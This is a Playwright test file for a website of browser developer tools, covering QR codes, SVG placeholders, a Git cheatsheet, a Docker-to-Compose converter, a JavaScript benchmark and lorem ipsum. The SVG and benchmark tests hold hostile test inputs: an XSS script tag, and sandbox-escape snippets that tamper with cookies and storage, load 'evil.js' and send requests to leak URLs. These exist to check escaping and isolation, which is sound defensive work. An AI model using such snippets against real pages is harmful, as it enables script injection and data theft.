import { readFile } from "node:fs/promises";
import jsQR from "jsqr";
import { expect, test, type Page } from "@playwright/test";
import { accessibilityViolations, alert, copyAndRead, field, hasHorizontalOverflow, watchForLeaks } from "./helpers";

const PAGES = ["qr-code-generator", "svg-placeholder-generator", "git-cheatsheet", "docker-run-to-compose", "javascript-benchmark", "lorem-ipsum-generator"];

test.describe("Phase 9 batch 2: accessibility and layout", () => {
  for (const slug of PAGES) {
    test(`${slug} has no axe violations and fits a phone screen`, async ({ page }) => {
      await page.goto(`/tools/${slug}`);
      expect(await accessibilityViolations(page)).toEqual([]);
      await page.setViewportSize({ width: 360, height: 800 });
      expect(await hasHorizontalOverflow(page)).toBe(false);
    });
  }
});

/** Draws an image element onto a canvas in the page and decodes it with jsQR. */
async function scanImage(page: Page, selector: string) {
  const { data, width, height } = await page.evaluate(async (sel) => {
    const img = document.querySelector(sel) as HTMLImageElement;
    await img.decode();
    const canvas = document.createElement("canvas");
    canvas.width = 400;
    canvas.height = 400;
    const ctx = canvas.getContext("2d")!;
    ctx.fillStyle = "#fff";
    ctx.fillRect(0, 0, 400, 400);
    ctx.drawImage(img, 0, 0, 400, 400);
    return { data: Array.from(ctx.getImageData(0, 0, 400, 400).data), width: 400, height: 400 };
  }, selector);
  return jsQR(Uint8ClampedArray.from(data), width, height)?.data;
}

test.describe("QR Code Generator", () => {
  test("generates a scannable code, downloads PNG and SVG, and sends nothing", async ({ page }) => {
    await page.goto("/tools/qr-code-generator");
    const check = watchForLeaks(page);
    const text = "https://example.com/menu?table=12&lang=fr — café ☕";
    await field(page, "Text or URL").fill(text);
    await expect(page.locator("[data-qr-preview]")).toBeVisible();
    expect(await scanImage(page, "[data-qr-preview]")).toBe(text);

    const [png] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "Download PNG" }).click()]);
    expect(png.suggestedFilename()).toBe("qr-code.png");
    const bytes = await readFile(await png.path());
    expect(bytes.subarray(1, 4).toString()).toBe("PNG");
    expect(bytes.readUInt32BE(16)).toBe(512);
    await expect(page.getByText("Downloaded qr-code.png (512×512 pixels).")).toBeVisible();

    const [svg] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "Download SVG" }).click()]);
    expect(await readFile(await svg.path(), "utf8")).toMatch(/^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg" width="512" height="512"/);
    expect(await copyAndRead(page, "Copy SVG markup")).toContain("<path fill=\"#000000\"");
    await check([text]);
  });

  test("validates settings and warns about hard-to-scan colors", async ({ page }) => {
    await page.goto("/tools/qr-code-generator");
    await field(page, "Text or URL").fill("hello");
    await page.getByLabel("Foreground", { exact: true }).fill("#dddddd");
    await expect(page.getByText("This code may be hard to scan")).toBeVisible();
    await page.getByRole("checkbox", { name: "Transparent background" }).check();
    await expect(page.getByText(/transparent background depends/i)).toBeVisible();
    await page.getByRole("spinbutton", { name: "Margin (modules)" }).fill("40");
    await expect(alert(page).filter({ hasText: "margin" })).toBeVisible();
    await expect(page.getByRole("button", { name: "Download PNG" })).toBeDisabled();
    await field(page, "Text or URL").fill("x".repeat(3000));
    await expect(alert(page).filter({ hasText: "too long" })).toBeVisible();
    await page.getByRole("button", { name: "Clear" }).click();
    await expect(page.getByText("Enter text to see the QR code.")).toBeVisible();
  });
});

test.describe("SVG Placeholder Generator", () => {
  test("escapes the label, previews and downloads the SVG", async ({ page }) => {
    const dialogs: string[] = [];
    page.on("dialog", (d) => {
      dialogs.push(d.message());
      void d.dismiss();
    });
    await page.goto("/tools/svg-placeholder-generator");
    await expect(page.locator("[data-placeholder-preview]")).toBeVisible();
    await page.getByLabel("Text (empty shows the size)").fill('<script>alert(1)</script> & "hi"');
    const svg = await copyAndRead(page, "Copy SVG markup");
    expect(svg).toContain("&lt;script&gt;alert(1)&lt;/script&gt; &amp; &quot;hi&quot;");
    expect(svg).not.toContain("<script");
    await page.getByRole("button", { name: "Open Graph 1200×630" }).click();
    await expect(page.getByLabel("Width (px)")).toHaveValue("1200");
    const [download] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "Download SVG" }).click()]);
    expect(download.suggestedFilename()).toBe("placeholder-1200x630.svg");
    expect(await readFile(await download.path(), "utf8")).toContain('width="1200" height="630"');
    expect(await copyAndRead(page, "Copy data URI")).toMatch(/^data:image\/svg\+xml,/);
    expect(await copyAndRead(page, "Copy img tag")).toMatch(/^<img src="data:image\/svg\+xml,[^"]+" width="1200" height="630" alt="/);
    expect(dialogs).toEqual([]);
  });

  test("validates dimensions and colors", async ({ page }) => {
    await page.goto("/tools/svg-placeholder-generator");
    await page.getByLabel("Width (px)").fill("5000");
    await expect(alert(page)).toContainText("from 1 to 4,000");
    await expect(page.getByRole("button", { name: "Download SVG" })).toBeDisabled();
    await page.getByLabel("Width (px)").fill("300");
    await page.getByLabel("Background", { exact: true }).fill("not-a-color");
    await expect(page.locator("[data-placeholder-preview]")).toBeVisible();
    await page.getByRole("button", { name: "Reset" }).click();
    await expect(page.getByLabel("Width (px)")).toHaveValue("600");
  });
});

test.describe("Git Cheatsheet", () => {
  test("filters commands, copies them and marks destructive ones", async ({ page }) => {
    await page.goto("/tools/git-cheatsheet");
    await expect(page.getByRole("heading", { name: "Common workflows" })).toBeVisible();
    await expect(page.getByText(/Uncommitted changes are lost permanently/)).toBeVisible();
    // "stash" alone also matches the worktree entry ("without stashing"), so search for a specific command.
    await page.getByLabel("Filter commands").fill("stash list");
    await expect(page.locator("[data-git-section]")).toHaveCount(1);
    await expect(page.locator('[data-git-section="stash"]')).toBeVisible();
    await expect(page.getByRole("heading", { name: "Common workflows" })).toHaveCount(0);
    expect(await copyAndRead(page, "Copy git stash list")).toBe("git stash list");
    await page.getByLabel("Filter commands").fill("");
    await page.getByRole("button", { name: "Tag releases" }).click();
    await expect(page.getByRole("button", { name: "Tag releases" })).toHaveAttribute("aria-pressed", "true");
    await expect(page.locator("[data-git-section]")).toHaveCount(1);
    await page.getByLabel("Filter commands").fill("zzz");
    await expect(page.getByText("No command matches.")).toBeVisible();
    await page.getByRole("button", { name: "Clear" }).click();
    await expect(page.locator("[data-git-section]")).toHaveCount(10);
  });
});

test.describe("Docker Run to Compose Converter", () => {
  test("converts the sample and reports notes", async ({ page }) => {
    await page.goto("/tools/docker-run-to-compose");
    await page.getByRole("button", { name: "Sample" }).click();
    const output = field(page, "compose.yaml");
    await expect(output).toHaveValue(/^services:\n  db:\n    image: postgres:16-alpine\n/);
    const yaml = await output.inputValue();
    expect(yaml).toContain('- "5432:5432"');
    expect(yaml).toContain("- ./init:/docker-entrypoint-initdb.d:ro");
    expect(yaml).toContain("volumes:\n  pgdata: {}");
    expect(yaml).toContain("- CMD-SHELL\n        - pg_isready -U app");
    await expect(page.getByText(/-d was not converted/)).toBeVisible();
    expect(await copyAndRead(page, "Copy compose YAML")).toBe(yaml);
    const [download] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "Download" }).click()]);
    expect(await readFile(await download.path(), "utf8")).toBe(yaml);
  });

  test("reports unsupported and ambiguous options", async ({ page }) => {
    await page.goto("/tools/docker-run-to-compose");
    const input = field(page, "docker run command");
    await input.fill("docker run --gpus all --frobnicate=1 nvidia/cuda");
    await expect(page.getByText("Unsupported options were not converted")).toBeVisible();
    await expect(page.getByText("--gpus all", { exact: true })).toBeVisible();
    await input.fill("docker run --frobnicate 1 nginx");
    await expect(alert(page)).toContainText("--frobnicate=value");
    await expect(field(page, "compose.yaml")).toHaveValue("");
    await input.fill("docker ps");
    await expect(alert(page)).toContainText("Only docker run");
  });
});

test.describe("JavaScript Benchmark Builder", () => {
  async function configure(page: Page, cases: string[], { samples = "5", limit = "5" } = {}) {
    await page.goto("/tools/javascript-benchmark");
    await expect(page.getByRole("button", { name: "Run benchmark" })).toBeEnabled();
    await page.getByRole("button", { name: "Clear" }).click();
    for (let i = 0; i < cases.length; i++) {
      if (i > 0) await page.getByRole("button", { name: "Add case" }).click();
      await page.getByLabel(`Name of case ${i + 1}`).fill(`Case ${i + 1}`);
      await page.getByLabel(`Code for case ${i + 1}`).fill(cases[i]);
    }
    await page.getByLabel("Samples per case").fill(samples);
    await page.getByLabel("Time limit (seconds)").fill(limit);
  }

  test("benchmarks the sample cases in the isolated sandbox", async ({ page }) => {
    await page.goto("/tools/javascript-benchmark");
    const frame = page.locator('iframe[title="Benchmark sandbox"]');
    await expect(frame).toHaveAttribute("sandbox", "allow-scripts");
    await page.getByLabel("Samples per case").fill("5");
    await page.getByRole("button", { name: "Run benchmark" }).click();
    const results = page.locator("[data-bench-results] > li");
    await expect(results).toHaveCount(3, { timeout: 20_000 });
    await expect(results.first()).toContainText("Fastest");
    await expect(page.locator("[data-ops]").first()).toHaveText(/ops\/s ±\d+\.\d%$/);
    expect(await copyAndRead(page, "Copy benchmark results")).toMatch(/^(for loop|filter\(\)\.length|reduce): .+ ops\/s ±/);
  });

  test("keeps benchmark code away from the page, its storage and the network", async ({ page }) => {
    const dialogs: string[] = [];
    page.on("dialog", (d) => {
      dialogs.push(d.message());
      void d.dismiss();
    });
    await configure(page, [
      "localStorage.setItem('stolen', '1');",
      "document.cookie = 'stolen=1';",
      "parent.document.body.remove();",
      "importScripts('https://example.com/evil.js');",
      "const x = new XMLHttpRequest(); x.open('GET', 'https://example.com/leak', false); x.send();",
      "fetch('https://example.com/fetch');",
      "Object.getPrototypeOf(self).fetch.call(self, 'https://example.com/proto');",
      "let ok = 1 + 1;",
    ]);
    await page.evaluate(() => localStorage.setItem("app-data", "intact"));
    const check = watchForLeaks(page);
    await page.getByRole("button", { name: "Run benchmark" }).click();
    await expect(page.locator("[data-bench-results] > li")).toHaveCount(1, { timeout: 20_000 });
    for (const n of [1, 2, 3, 4, 5, 6, 7]) await expect(alert(page).filter({ hasText: `Case ${n} failed` })).toBeVisible();
    expect(await page.evaluate(() => [localStorage.getItem("stolen"), localStorage.getItem("app-data"), document.cookie])).toEqual([null, "intact", ""]);
    await expect(page.getByRole("heading", { level: 1 })).toHaveText("JavaScript Benchmark Builder");
    await check(["example.com/leak", "example.com/evil.js", "example.com/fetch", "example.com/proto"]);
    expect(dialogs).toEqual([]);
  });

  test("stops an endless loop at the time limit while the page stays responsive", async ({ page }) => {
    await configure(page, ["while (true) {}"], { limit: "1" });
    await page.getByRole("button", { name: "Run benchmark" }).click();
    await expect(page.getByRole("button", { name: "Stop" })).toBeVisible();
    // The page keeps responding while the loop runs in the isolated worker.
    await page.getByLabel("Samples per case").focus();
    await expect(page.getByText("The benchmark did not finish within the time limit")).toBeVisible({ timeout: 10_000 });
    await expect(page.getByRole("button", { name: "Run benchmark" })).toBeEnabled({ timeout: 10_000 });
  });

  test("reports syntax errors and validates settings", async ({ page }) => {
    await configure(page, ["let = ;", "1 + 1;"]);
    await page.getByRole("button", { name: "Run benchmark" }).click();
    await expect(alert(page).filter({ hasText: "Case 1 failed" })).toContainText("Syntax error", { timeout: 20_000 });
    await page.getByLabel("Samples per case").fill("1");
    await expect(page.getByText(/Samples must be from 5 to 100/)).toBeVisible();
    await expect(page.getByRole("button", { name: "Run benchmark" })).toBeDisabled();
  });
});

test.describe("Lorem Ipsum Generator", () => {
  test("generates paragraphs, lists and HTML", async ({ page }) => {
    await page.goto("/tools/lorem-ipsum-generator");
    const output = field(page, "Text");
    await expect(output).toHaveValue(/^Lorem ipsum dolor sit amet, consectetur adipiscing elit\./);
    expect((await output.inputValue()).split("\n\n")).toHaveLength(3);
    const before = await output.inputValue();
    await page.getByRole("button", { name: "Regenerate" }).click();
    await expect(output).not.toHaveValue(before);

    await page.getByText("List items", { exact: true }).click();
    await page.getByText("HTML", { exact: true }).click();
    const html = field(page, "HTML");
    await expect(html).toHaveValue(/^<ul>\n  <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit<\/li>\n/);
    expect((await html.inputValue()).match(/<li>/g)).toHaveLength(3);
    expect(await copyAndRead(page, "Copy generated text")).toBe(await html.inputValue());
  });

  test("validates the count and supports exact word counts", async ({ page }) => {
    await page.goto("/tools/lorem-ipsum-generator");
    await page.getByText("Words", { exact: true }).click();
    await page.getByLabel("How many").fill("7");
    await expect(field(page, "Text")).toHaveValue(/^Lorem ipsum dolor sit amet \w+ \w+$/);
    await expect(page.getByText(/^7 words/)).toBeVisible();
    await page.getByLabel("How many").fill("0");
    await expect(alert(page)).toContainText("from 1 to 10,000");
  });
});
